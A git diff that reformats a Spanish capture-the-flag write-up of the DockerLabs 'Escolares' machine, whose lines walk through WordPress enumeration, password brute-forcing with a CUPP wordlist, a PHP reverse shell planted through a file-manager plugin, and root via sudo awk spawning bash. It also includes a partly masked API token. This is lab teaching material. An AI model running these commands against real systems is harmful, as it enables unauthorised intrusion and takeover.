@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Escolares 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Escolares ​​
+
+## 🖥️ Writeup - Escolares
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `WordPress` `OSINT` `CUPP` `WPScan` `Brute Force` `RCE` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip escolares.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh escolares.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 23:29 CET
 Nmap scan report for 172.17.0.2
@@ -82,15 +91,15 @@ Identificamos los puertos `22` y `80` abiertos.
 
 Accedemos al servicio web del puerto `80` y encontramos la siguiente página:
 
-![alt text](../../images/escolares.png)
+![alt text](../../.gitbook/assets/escolares.png)
 
 En la pestaña profesores encontramos la información personal del profesorado, lo cual nos da una gran pista:
 
-![alt text](../../images/luisprofe.png)
+![alt text](../../.gitbook/assets/luisprofe.png)
 
 Nos dice que estamos ante un `WordPress` y que `Luis` es el administrador de este.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -99,6 +108,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/d
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -127,13 +137,14 @@ Progress: 193790 / 1543906 (12.55%)
 
 Efectivamente, confirmamos que existe un `WordPress`, por lo que procedemos a su enumeración con `WPScan`.
 
-# WPSCAN
+## WPSCAN
 
 ```bash
 wpscan --url http://172.17.0.2/wordpress --api-token "srCmCA5xh0l66CHqXAXXXXXesEEjKKq2ckuzYle5k" --enumerate u
 ```
 
 Info:
+
 ```
 _______________________________________________________________
          __          _______   _____
@@ -231,6 +242,7 @@ cupp -i
 ```
 
 Info:
+
 ```
 ___________ 
    cupp.py!                 # Common
@@ -286,6 +298,7 @@ wpscan --url http://172.17.0.2/wordpress --passwords luis.txt --usernames luisil
 ```
 
 Info:
+
 ```
 _______________________________________________________________
          __          _______   _____
@@ -372,7 +385,7 @@ Encontramos las credenciales válidas para el usuario `luisillo` : `Luis1981`.
 
 Intentamos acceder con este usuario y contraseña al dashboard de `WordPress`, pero obtenemos el siguiente error:
 
-![alt text](../../images/escolaresdl.png)
+![alt text](../../.gitbook/assets/escolaresdl.png)
 
 Esto indica que debemos añadir el dominio `escolares.dl` al archivo `/etc/hosts`.
 
@@ -381,6 +394,7 @@ nano /etc/hosts
 ```
 
 Info:
+
 ```
 127.0.0.1	    localhost
 127.0.1.1	    kali
@@ -393,7 +407,7 @@ ff02::2 ip6-allrouters
 
 Tras configurar el archivo, intentamos acceder otra vez al `wp-admin` y entramos con éxito.
 
-![alt text](../../images/wp_luis.png)
+![alt text](../../.gitbook/assets/wp_luis.png)
 
 Dentro del panel de administración encontramos un `plugin` llamado `WP File Manager`.
 
@@ -401,7 +415,7 @@ Este plugin nos permite gestionar (añadir, eliminar, editar...) los archivos de
 
 Nos aprovechamos de este componente para editar el archivo `index.php`, que se encuentra en el directorio `/themes`.
 
-![alt text](../../images/revshellwp.png)
+![alt text](../../.gitbook/assets/revshellwp.png)
 
 Sustituimos el contenido original por código `PHP` malicioso para obtener una `reverse shell`.
 
@@ -418,6 +432,7 @@ http://172.17.0.2/wordpress/wp-content/themes/index.php
 ```
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 33258
@@ -428,28 +443,33 @@ www-data@51476b64c967:/var/www/html/wordpress/wp-content/themes$
 
 Recibimos la shell como el usuario `www-data`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Leemos el archivo `/etc/passwd` y verificamos que existe en el sistema un usuario llamado `luisillo`.
 
@@ -466,6 +486,7 @@ su luisillo
 ```
 
 Info:
+
 ```
 luisillo@51476b64c967:/home$ whoami
 luisillo
@@ -479,6 +500,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for luisillo on 51476b64c967:
     env_reset, mail_badpass,
@@ -496,6 +518,7 @@ sudo awk 'BEGIN {system("/bin/bash")}'
 ```
 
 Info:
+
 ```
 root@51476b64c967:/home# whoami
 root
